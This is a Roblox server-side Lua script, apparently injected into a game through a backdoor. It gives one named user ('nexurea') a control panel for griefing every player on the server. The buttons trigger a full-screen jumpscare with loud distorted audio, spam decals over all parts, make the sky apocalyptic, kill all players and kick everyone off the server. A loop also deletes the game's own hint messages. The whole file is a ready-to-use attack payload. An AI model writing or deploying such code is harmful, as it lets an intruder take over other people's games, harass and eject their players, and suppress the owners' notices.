local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Lighting = game:GetService("Lighting")
local RunService = game:GetService("RunService")

local TARGET_NICK = "nexurea"
local SOUND_ID = "rbxassetid://131629302846206"
local TEXTURE_NEXUREA = "rbxassetid://77711853043169"
local TEXTURE_ROOTLESS = "rbxassetid://118035264530403"
local SKYBOX_ID = "rbxassetid://77711853043169"

local musicSound = nil
local originalLightingState = nil
local tornadoActive = false
local tornadoFolder = nil
local tornadoConnection = nil
local tornadoRunning = false

local remoteEvent = ReplicatedStorage:FindFirstChild("NexureaControlEvent")
if not remoteEvent then
    remoteEvent = Instance.new("RemoteEvent")
    remoteEvent.Name = "NexureaControlEvent"
    remoteEvent.Parent = ReplicatedStorage
end

local function createDistortedSound(parent, soundId, volume, looped)
    local sound = Instance.new("Sound")
    sound.SoundId = soundId
    sound.Volume = volume
    sound.Looped = looped or false
    
    local pitch = Instance.new("PitchShiftSoundEffect")
    pitch.Octave = 0.089
    pitch.Parent = sound
    
    local distortion = Instance.new("DistortionSoundEffect")
    distortion.Level = 0.95
    distortion.Parent = sound
    
    sound.Parent = parent
    return sound
end

local function toggleMusic()
    if musicSound then
        musicSound:Stop()
        musicSound:Destroy()
        musicSound = nil
    else
        musicSound = createDistortedSound(workspace, SOUND_ID, 3, true)
        musicSound:Play()
    end
end

local function triggerScreamer()
    for _, targetPlayer in ipairs(Players:GetPlayers()) do
        task.spawn(function()
            local targetGui = targetPlayer:FindFirstChildOfClass("PlayerGui")
            if not targetGui then return end
            
            local oldScreamer = targetGui:FindFirstChild("NexureaScreamerGui")
            if oldScreamer then oldScreamer:Destroy() end
            
            local screamerGui = Instance.new("ScreenGui")
            screamerGui.Name = "NexureaScreamerGui"
            screamerGui.DisplayOrder = 999999
            screamerGui.IgnoreGuiInset = true
            
            local img = Instance.new("ImageLabel")
            img.Size = UDim2.new(1, 0, 1, 0)
            img.Image = TEXTURE_NEXUREA
            img.ScaleType = Enum.ScaleType.Stretch
            img.BorderSizePixel = 0
            img.Parent = screamerGui
            
            local sfx = createDistortedSound(screamerGui, SOUND_ID, 10, false)
            sfx.Name = "ScreamerSound"
            
            local cleanupScript = Instance.new("LocalScript")
            cleanupScript.Name = "ScreamerCleanup"
            cleanupScript.Source = [[
                local sound = script.Parent:WaitForChild("ScreamerSound", 5)
                if sound then sound:Play() end
                task.wait(2)
                script.Parent:Destroy()
            ]]
            cleanupScript.Parent = screamerGui
            screamerGui.Parent = targetGui
        end)
    end
end

local function runDecalSpam()
    local counter = 0
    local partsToSpam = {}
    
    local function collectParts(parent)
        for _, child in ipairs(parent:GetChildren()) do
            local isCharacterPart = false
            for _, player in ipairs(Players:GetPlayers()) do
                if player.Character and child:IsDescendantOf(player.Character) then
                    isCharacterPart = true
                    break
                end
            end
            if not isCharacterPart then
                if child:IsA("BasePart") then
                    table.insert(partsToSpam, child)
                end
                collectParts(child)
            end
        end
    end
    
    collectParts(workspace)
    
    task.spawn(function()
        for i, part in ipairs(partsToSpam) do
            if not part or not part.Parent then continue end
            counter = counter + 1
            local chosenTexture = (counter % 2 == 0) and TEXTURE_NEXUREA or TEXTURE_ROOTLESS
            local faces = {
                Enum.NormalId.Front, Enum.NormalId.Back,
                Enum.NormalId.Left, Enum.NormalId.Right,
                Enum.NormalId.Top, Enum.NormalId.Bottom
            }
            for _, face in ipairs(faces) do
                local decal = Instance.new("Decal")
                decal.Texture = chosenTexture
                decal.Face = face
                decal.Name = "NexureaSpamDecal"
                decal.Parent = part
            end
            if i % 50 == 0 then task.wait() end
        end
    end)
end

local function toggleApocalypse()
    if originalLightingState then
        Lighting.ClockTime = originalLightingState.ClockTime
        Lighting.FogColor = originalLightingState.FogColor
        Lighting.FogStart = originalLightingState.FogStart
        Lighting.FogEnd = originalLightingState.FogEnd
        Lighting.OutdoorAmbient = originalLightingState.OutdoorAmbient
        Lighting.Ambient = originalLightingState.Ambient
        
        for _, obj in ipairs(Lighting:GetChildren()) do
            if obj.Name == "ApocalypseSky" then obj:Destroy() end
        end
        for _, skyData in ipairs(originalLightingState.Skies) do
            if skyData.instance then skyData.instance.Parent = skyData.parent end
        end
        originalLightingState = nil
    else
        originalLightingState = {
            ClockTime = Lighting.ClockTime,
            FogColor = Lighting.FogColor,
            FogStart = Lighting.FogStart,
            FogEnd = Lighting.FogEnd,
            OutdoorAmbient = Lighting.OutdoorAmbient,
            Ambient = Lighting.Ambient,
            Skies = {}
        }
        for _, obj in ipairs(Lighting:GetChildren()) do
            if obj:IsA("Sky") then
                table.insert(originalLightingState.Skies, {parent = obj.Parent, instance = obj})
                obj.Parent = nil
            end
        end
        
        Lighting.ClockTime = 0
        Lighting.FogColor = Color3.fromRGB(50, 0, 0)
        Lighting.FogStart = 0
        Lighting.FogEnd = 150
        Lighting.OutdoorAmbient = Color3.fromRGB(0, 0, 0)
        Lighting.Ambient = Color3.fromRGB(15, 0, 0)
        
        local sky = Instance.new("Sky")
        sky.Name = "ApocalypseSky"
        sky.SkyboxBk = SKYBOX_ID
        sky.SkyboxDn = SKYBOX_ID
        sky.SkyboxFt = SKYBOX_ID
        sky.SkyboxLf = SKYBOX_ID
        sky.SkyboxRt = SKYBOX_ID
        sky.SkyboxUp = SKYBOX_ID
        sky.Parent = Lighting
    end
end

local function sendHint(text)
    for _, item in ipairs(workspace:GetChildren()) do
        if item.Name == "NexureaActiveHint" then item:Destroy() end
    end
    local hint = Instance.new("Hint")
    hint.Name = "NexureaActiveHint"
    hint.Text = text
    hint.Parent = workspace
end

local function stopTornado()
    tornadoActive = false
    if tornadoConnection then
        tornadoConnection:Disconnect()
        tornadoConnection = nil
    end
    if tornadoFolder then
        tornadoFolder:Destroy()
        tornadoFolder = nil
    end
end

local function startTornado(creatorName)
    stopTornado()
    local creator = Players:FindFirstChild(creatorName)
    if not creator or not creator.Character then return end
    
    tornadoActive = true
    tornadoFolder = Instance.new("Folder")
    tornadoFolder.Name = "NexureaTornado"
    tornadoFolder.Parent = workspace
    
    local parts = {}
    local numParts = 45
    local baseRadius = 4.5
    local maxHeight = 38
    
    for i = 1, numParts do
        local part = Instance.new("Part")
        part.Size = Vector3.new(math.random(2, 4), math.random(2, 4), math.random(2, 4))
        part.Color = Color3.fromRGB(0, 0, 0)
        part.Material = Enum.Material.Neon
        part.Transparency = 0.35
        part.CanCollide = false
        part.Anchored = true
        part.Parent = tornadoFolder
        
        parts[i] = {
            instance = part,
            angle = math.random() * math.pi * 2,
            height = (i / numParts) * maxHeight,
            speed = math.random(4, 7) * (math.random(0, 1) == 0 and 1 or -1),
            riseSpeed = math.random(5, 9)
        }
    end
    
    tornadoConnection = RunService.Heartbeat:Connect(function(dt)
        if not creator.Character or not creator.Character:FindFirstChild("HumanoidRootPart") then
            stopTornado()
            tornadoRunning = false
            return
        end
        local centerPos = creator.Character.HumanoidRootPart.Position
        for _, p in ipairs(parts) do
            if p.instance and p.instance.Parent then
                p.angle = p.angle + p.speed * dt
                p.height = p.height + p.riseSpeed * dt
                if p.height > maxHeight then
                    p.height = 0
                    p.angle = math.random() * math.pi * 2
                end
                local radius = baseRadius + (p.height * 0.45)
                local offset = Vector3.new(
                    math.cos(p.angle) * radius,
                    p.height - 6,
                    math.sin(p.angle) * radius
                )
                p.instance.Position = centerPos + offset
                p.instance.Orientation = Vector3.new(p.angle * 45, p.angle * 90, p.angle * 135)
            end
        end
    end)
end

local function makeNoob(character)
    if not character then return end
    for _, item in ipairs(character:GetChildren()) do
        if item:IsA("Shirt") or item:IsA("Pants") or item:IsA("GraphicShirt") or 
           item:IsA("Accessory") or item:IsA("ShirtGraphic") or item:IsA("CharacterMesh") then
            item:Destroy()
        end
    end
    local bodyColors = character:FindFirstChildOfClass("BodyColors")
    if bodyColors then bodyColors:Destroy() end
    bodyColors = Instance.new("BodyColors")
    bodyColors.HeadColor3 = Color3.fromRGB(245, 205, 48)
    bodyColors.TorsoColor3 = Color3.fromRGB(13, 105, 172)
    bodyColors.LeftArmColor3 = Color3.fromRGB(245, 205, 48)
    bodyColors.RightArmColor3 = Color3.fromRGB(245, 205, 48)
    bodyColors.LeftLegColor3 = Color3.fromRGB(40, 127, 71)
    bodyColors.RightLegColor3 = Color3.fromRGB(40, 127, 71)
    bodyColors.Parent = character
end

local function makeEveryoneNoob()
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character then makeNoob(player.Character) end
    end
end

local function killEveryone()
    for _, player in ipairs(Players:GetPlayers()) do
        local char = player.Character
        if char then
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then hum.Health = 0 end
        end
    end
end

local function shutdownServer()
    for _, player in ipairs(Players:GetPlayers()) do
        player:Kick("[nexurea] closed the server. Apocalypse complete.")
    end
end

task.spawn(function()
    while true do
        task.wait(0.3)
        for _, item in ipairs(workspace:GetChildren()) do
            if (item:IsA("Hint") or item:IsA("Message")) and item.Name ~= "NexureaActiveHint" then
                item:Destroy()
            end
        end
    end
end)

local function createGui(player)
    local playerGui = player:FindFirstChildOfClass("PlayerGui")
    if not playerGui then return end
    
    local existing = playerGui:FindFirstChild("SS_Panel_Nexurea")
    if existing then existing:Destroy() end
    
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "SS_Panel_Nexurea"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    
    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.new(0, 440, 0, 480)
    mainFrame.Position = UDim2.new(0.5, -220, 0.5, -240)
    mainFrame.BackgroundColor3 = Color3.fromRGB(15, 10, 15)
    mainFrame.BorderSizePixel = 0
    mainFrame.Active = true
    mainFrame.Parent = screenGui
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = mainFrame
    
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(255, 0, 128)
    stroke.Thickness = 2.5
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    stroke.Parent = mainFrame
    
    local titleBar = Instance.new("Frame")
    titleBar.Name = "TitleBar"
    titleBar.Size = UDim2.new(1, 0, 0, 45)
    titleBar.BackgroundColor3 = Color3.fromRGB(25, 15, 25)
    titleBar.BorderSizePixel = 0
    titleBar.Parent = mainFrame
    
    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 12)
    titleCorner.Parent = titleBar
    
    local titleCover = Instance.new("Frame")
    titleCover.Size = UDim2.new(1, 0, 0, 10)
    titleCover.Position = UDim2.new(0, 0, 1, -10)
    titleCover.BackgroundColor3 = Color3.fromRGB(25, 15, 25)
    titleCover.BorderSizePixel = 0
    titleCover.Parent = titleBar
    
    local titleText = Instance.new("TextLabel")
    titleText.Name = "TitleText"
    titleText.Size = UDim2.new(1, -20, 1, 0)
    titleText.Position = UDim2.new(0, 15, 0, 0)
    titleText.BackgroundTransparency = 1
    titleText.Text = "nexurea // server panel v2.3 (SS ONLY)"
    titleText.Font = Enum.Font.GothamBold
    titleText.TextSize = 16
    titleText.TextColor3 = Color3.fromRGB(255, 0, 128)
    titleText.TextXAlignment = Enum.TextXAlignment.Left
    titleText.Parent = titleBar
    
    local container = Instance.new("Frame")
    container.Name = "Container"
    container.Size = UDim2.new(1, -30, 1, -65)
    container.Position = UDim2.new(0, 15, 0, 55)
    container.BackgroundTransparency = 1
    container.Parent = mainFrame
    
    local gridFrame = Instance.new("Frame")
    gridFrame.Name = "GridFrame"
    gridFrame.Size = UDim2.new(1, 0, 0, 210)
    gridFrame.BackgroundTransparency = 1
    gridFrame.Parent = container
    
    local layout = Instance.new("UIGridLayout")
    layout.CellSize = UDim2.new(0, 195, 0, 42)
    layout.CellPadding = UDim2.new(0, 20, 0, 12)
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.Parent = gridFrame
    
    local function createButton(name, text, layoutOrder)
        local btn = Instance.new("TextButton")
        btn.Name = name
        btn.Text = text
        btn.Size = UDim2.new(0, 195, 0, 42)
        btn.BackgroundColor3 = Color3.fromRGB(28, 12, 22)
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 12
        btn.TextColor3 = Color3.fromRGB(220, 220, 220)
        btn.LayoutOrder = layoutOrder
        btn.BorderSizePixel = 0
        btn.Parent = gridFrame
        
        local btnCorner = Instance.new("UICorner")
        btnCorner.CornerRadius = UDim.new(0, 6)
        btnCorner.Parent = btn
        
        local btnStroke = Instance.new("UIStroke")
        btnStroke.Color = Color3.fromRGB(120, 20, 70)
        btnStroke.Thickness = 1.2
        btnStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        btnStroke.Parent = btn
        
        return btn
    end
    
    local btnMusic = createButton("BtnMusic", "PLAY MUSIC", 1)
    local btnScreamer = createButton("BtnScreamer", "LAUNCH SCREAMER", 2)
    local btnDecal = createButton("BtnDecal", "DECAL SPAM", 3)
    local btnApocalypse = createButton("BtnApocalypse", "APOCALYPSE SKY", 4)
    local btnTornado = createButton("BtnTornado", "TOGGLE TORNADO", 5)
    local btnNoob = createButton("BtnNoob", "CHANGE SKINS (NOOB)", 6)
    local btnReset = createButton("BtnReset", "RESET EVERYONE", 7)
    local btnShutdown = createButton("BtnShutdown", "SHUTDOWN SERVER", 8)
    
    local hintFrame = Instance.new("Frame")
    hintFrame.Name = "HintFrame"
    hintFrame.Size = UDim2.new(1, 0, 0, 120)
    hintFrame.Position = UDim2.new(0, 0, 0, 230)
    hintFrame.BackgroundColor3 = Color3.fromRGB(22, 12, 20)
    hintFrame.BorderSizePixel = 0
    hintFrame.Parent = container
    
    local hintCorner = Instance.new("UICorner")
    hintCorner.CornerRadius = UDim.new(0, 8)
    hintCorner.Parent = hintFrame
    
    local hintStroke = Instance.new("UIStroke")
    hintStroke.Color = Color3.fromRGB(150, 0, 80)
    hintStroke.Thickness = 1
    hintStroke.Parent = hintFrame
    
    local hintTitle = Instance.new("TextLabel")
    hintTitle.Size = UDim2.new(1, -20, 0, 25)
    hintTitle.Position = UDim2.new(0, 10, 0, 5)
    hintTitle.BackgroundTransparency = 1
    hintTitle.Text = "HINT SYSTEM (CUSTOM TEXT)"
    hintTitle.Font = Enum.Font.GothamBold
    hintTitle.TextSize = 10
    hintTitle.TextColor3 = Color3.fromRGB(255, 0, 128)
    hintTitle.TextXAlignment = Enum.TextXAlignment.Left
    hintTitle.Parent = hintFrame
    
    local hintTextBox = Instance.new("TextBox")
    hintTextBox.Name = "HintTextBox"
    hintTextBox.Size = UDim2.new(1, -20, 0, 38)
    hintTextBox.Position = UDim2.new(0, 10, 0, 30)
    hintTextBox.BackgroundColor3 = Color3.fromRGB(12, 6, 12)
    hintTextBox.BorderSizePixel = 0
    hintTextBox.Font = Enum.Font.Gotham
    hintTextBox.TextSize = 13
    hintTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    hintTextBox.PlaceholderText = "Type custom hint text..."
    hintTextBox.PlaceholderColor3 = Color3.fromRGB(120, 80, 100)
    hintTextBox.ClearTextOnFocus = false
    hintTextBox.Parent = hintFrame
    
    local txtCorner = Instance.new("UICorner")
    txtCorner.CornerRadius = UDim.new(0, 5)
    txtCorner.Parent = hintTextBox
    
    local txtStroke = Instance.new("UIStroke")
    txtStroke.Color = Color3.fromRGB(80, 10, 45)
    txtStroke.Thickness = 1
    txtStroke.Parent = hintTextBox
    
    local btnSendHint = Instance.new("TextButton")
    btnSendHint.Name = "BtnSendHint"
    btnSendHint.Text = "SEND CUSTOM HINT"
    btnSendHint.Size = UDim2.new(1, -20, 0, 36)
    btnSendHint.Position = UDim2.new(0, 10, 0, 75)
    btnSendHint.BackgroundColor3 = Color3.fromRGB(255, 0, 128)
    btnSendHint.Font = Enum.Font.GothamBold
    btnSendHint.TextSize = 12
    btnSendHint.TextColor3 = Color3.fromRGB(255, 255, 255)
    btnSendHint.BorderSizePixel = 0
    btnSendHint.Parent = hintFrame
    
    local sendCorner = Instance.new("UICorner")
    sendCorner.CornerRadius = UDim.new(0, 6)
    sendCorner.Parent = btnSendHint
    
    local localScript = Instance.new("LocalScript")
    localScript.Name = "PanelLocalScript"
    localScript.Source = [[
        local Players = game:GetService("Players")
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local UserInputService = game:GetService("UserInputService")
        local TweenService = game:GetService("TweenService")
        
        local frame = script.Parent
        local titleBar = frame:WaitForChild("TitleBar", 5)
        local container = frame:WaitForChild("Container", 5)
        if not titleBar or not container then return end
        
        local gridFrame = container:WaitForChild("GridFrame", 5)
        local remoteEvent = ReplicatedStorage:FindFirstChild("NexureaControlEvent")
        
        if not remoteEvent then
            remoteEvent = ReplicatedStorage:WaitForChild("NexureaControlEvent", 10)
        end
        if not remoteEvent then return end
        
        local dragging = false
        local dragInput, dragStart, startPos
        local function update(input)
            local delta = input.Position - dragStart
            local targetPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
            TweenService:Create(frame, TweenInfo.new(0.08, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {Position = targetPos}):Play()
        end
        titleBar.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragStart = input.Position
                startPos = frame.Position
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then dragging = false end
                end)
            end
        end)
        titleBar.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                dragInput = input
            end
        end)
        UserInputService.InputChanged:Connect(function(input)
            if input == dragInput and dragging then update(input) end
        end)
        
        local function bindEffects(btn)
            local stroke = btn:FindFirstChildOfClass("UIStroke")
            local origBg = btn.BackgroundColor3
            btn.MouseEnter:Connect(function()
                TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(50, 15, 35)}):Play()
                if stroke then TweenService:Create(stroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(255, 0, 128), Thickness = 1.8}):Play() end
            end)
            btn.MouseLeave:Connect(function()
                TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = origBg}):Play()
                if stroke then TweenService:Create(stroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(120, 20, 70), Thickness = 1.2}):Play() end
            end)
        end
        
        for _, obj in ipairs(gridFrame:GetChildren()) do
            if obj:IsA("TextButton") then
                bindEffects(obj)
                obj.MouseButton1Click:Connect(function()
                    if obj.Name == "BtnMusic" then
                        obj.Text = (obj.Text == "PLAY MUSIC") and "STOP MUSIC" or "PLAY MUSIC"
                        obj.TextColor3 = (obj.Text == "STOP MUSIC") and Color3.fromRGB(255, 0, 128) or Color3.fromRGB(220, 220, 220)
                    elseif obj.Name == "BtnApocalypse" then
                        obj.Text = (obj.Text == "APOCALYPSE SKY") and "DISABLE APOCALYPSE" or "APOCALYPSE SKY"
                        obj.TextColor3 = (obj.Text == "DISABLE APOCALYPSE") and Color3.fromRGB(255, 0, 128) or Color3.fromRGB(220, 220, 220)
                    elseif obj.Name == "BtnTornado" then
                        obj.Text = (obj.Text == "TOGGLE TORNADO") and "STOP TORNADO" or "TOGGLE TORNADO"
                        obj.TextColor3 = (obj.Text == "STOP TORNADO") and Color3.fromRGB(255, 0, 128) or Color3.fromRGB(220, 220, 220)
                    end
                    remoteEvent:FireServer(obj.Name)
                end)
            end
        end
        
        local hintFrame = container:WaitForChild("HintFrame", 5)
        if hintFrame then
            local btnSendHint = hintFrame:WaitForChild("BtnSendHint", 5)
            local hintTextBox = hintFrame:WaitForChild("HintTextBox", 5)
            if btnSendHint and hintTextBox then
                btnSendHint.MouseEnter:Connect(function() TweenService:Create(btnSendHint, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(200, 0, 100)}):Play() end)
                btnSendHint.MouseLeave:Connect(function() TweenService:Create(btnSendHint, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255, 0, 128)}):Play() end)
                btnSendHint.MouseButton1Click:Connect(function()
                    remoteEvent:FireServer("BtnSendHint", hintTextBox.Text)
                end)
            end
        end
    ]]
    localScript.Parent = mainFrame
    screenGui.Parent = playerGui
end

remoteEvent.OnServerEvent:Connect(function(player, action, arg1)
    if player.Name:lower() ~= TARGET_NICK:lower() then
        player:Kick("Unauthorised developer action.")
        return
    end
    
    if action == "BtnMusic" then
        toggleMusic()
    elseif action == "BtnScreamer" then
        triggerScreamer()
    elseif action == "BtnDecal" then
        runDecalSpam()
    elseif action == "BtnApocalypse" then
        toggleApocalypse()
    elseif action == "BtnTornado" then
        if tornadoRunning then
            stopTornado()
            tornadoRunning = false
        else
            startTornado(player.Name)
            tornadoRunning = true
        end
    elseif action == "BtnNoob" then
        makeEveryoneNoob()
    elseif action == "BtnReset" then
        killEveryone()
    elseif action == "BtnShutdown" then
        shutdownServer()
    elseif action == "BtnSendHint" then
        local text = tostring(arg1 or "")
        if text ~= "" then sendHint(text) end
    end
end)

local function checkAndGive(player)
    if player.Name:lower() == TARGET_NICK:lower() then
        createGui(player)
        
        player.CharacterAdded:Connect(function()
            createGui(player)
        end)
    end
end

for _, player in ipairs(Players:GetPlayers()) do
    checkAndGive(player)
end

Players.PlayerAdded:Connect(checkAndGive)

print("[SS Panel v2.3 INJECTED FOR USER: " .. TARGET_NICK .. "]")
